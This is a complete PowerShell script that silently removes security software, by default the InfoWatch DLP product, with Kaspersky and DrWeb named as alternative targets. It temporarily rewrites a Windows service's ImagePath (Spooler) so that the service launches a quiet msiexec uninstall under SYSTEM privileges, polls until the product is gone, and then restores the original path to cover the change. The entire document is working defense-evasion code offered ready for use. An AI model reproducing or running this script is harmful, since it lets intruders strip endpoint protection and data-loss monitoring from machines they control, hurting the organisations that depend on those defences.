# A PowerShell script that uninstalls a specified software product by temporarily modifying a Windows service's 
# ImagePath to trigger the uninstallation process via msiexec.exe, then restores the original service path.

# --- Settings ---
$ProductName = "InfoWatch"          # Specify product to uninstall (e.g., "Kaspersky", "DrWeb")
$ServiceName = "Spooler"            # Service to use for uninstall (e.g., Spooler, upnphost, wuauserv)
$MaxWait = 90                       # Maximum wait time for uninstall (seconds)
$CheckInterval = 5                  # Check interval (seconds)

# --- Function: Check if product is installed ---
function Test-ProductInstalled {
    param(
        [string]$Name
    )
    $UninstallKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    $SubKeys = Get-ChildItem -Path $UninstallKey -ErrorAction SilentlyContinue
    foreach ($Key in $SubKeys) {
        $DisplayName = (Get-ItemProperty -Path $Key.PSPath -ErrorAction SilentlyContinue).DisplayName
        if ($DisplayName -and $DisplayName -like "*$Name*") {
            return $true
        }
    }
    return $false
}

# --- 1. Get original service path ---
$OriginalPath = (Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'").PathName
if (-not $OriginalPath) {
    Write-Error "Service '$ServiceName' not found or access denied."
    exit
}
Write-Host "[*] Original service path: $OriginalPath" -ForegroundColor Cyan

# --- 2. Find product GUID ---
$UninstallKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
$SubKeys = Get-ChildItem -Path $UninstallKey -ErrorAction SilentlyContinue
$GUID = $null
foreach ($Key in $SubKeys) {
    $DisplayName = (Get-ItemProperty -Path $Key.PSPath -ErrorAction SilentlyContinue).DisplayName
    if ($DisplayName -like "*$ProductName*") {
        $GUID = $Key.PSChildName
        break
    }
}

if (-not $GUID) {
    Write-Warning "$ProductName not found in registry. Maybe already uninstalled?"
    exit
}

Write-Host "[*] Found $ProductName GUID: $GUID" -ForegroundColor Green

# --- 3. Construct uninstall command ---
$InnerCommand = "msiexec.exe /x $GUID /qn /norestart"
$NewImagePath = "cmd.exe /c $InnerCommand"

Write-Host "[*] Setting ImagePath to trigger uninstall..." -ForegroundColor Yellow

# --- 4. Modify ImagePath in registry ---
$regPath = "HKLM\SYSTEM\CurrentControlSet\Services\$ServiceName"
$regCmd = "reg add `"$regPath`" /v ImagePath /t REG_EXPAND_SZ /d `"$NewImagePath`" /f"
Invoke-Expression $regCmd | Out-Null

# --- 5. Stop and start service ---
Write-Host "[*] Stopping $ServiceName..." -ForegroundColor Yellow
sc.exe stop "$ServiceName" | Out-Null
Start-Sleep -Seconds 3

Write-Host "[*] Starting $ServiceName — uninstalling $ProductName..." -ForegroundColor Green
sc.exe start "$ServiceName" | Out-Null

# --- 6. Wait for uninstall to complete ---
$elapsed = 0
Write-Host "[⏳] Waiting for uninstall to complete..." -ForegroundColor Yellow

while ($elapsed -lt $MaxWait) {
    Start-Sleep -Seconds $CheckInterval
    $elapsed += $CheckInterval

    if (-not (Test-ProductInstalled -Name $ProductName)) {
        Write-Host "[✅] $ProductName has been successfully uninstalled!" -ForegroundColor Green
        break
    }

    Write-Host "    [$elapsed/$MaxWait] Still waiting... $ProductName is present." -ForegroundColor Gray
}

if ($elapsed -ge $MaxWait) {
    Write-Warning "Timeout reached. Uninstall may have failed or is still running."
}

# --- 7. Restore original ImagePath ---
Write-Host "[*] Restoring original ImagePath..." -ForegroundColor Yellow
$restoreCmd = "reg add `"$regPath`" /v ImagePath /t REG_EXPAND_SZ /d `"$OriginalPath`" /f"
Invoke-Expression $restoreCmd | Out-Null

# Restart service
sc.exe stop "$ServiceName" | Out-Null
Start-Sleep -Seconds 2
sc.exe start "$ServiceName" | Out-Null

Write-Host "[+] Cleanup complete. Service restored." -ForegroundColor Green
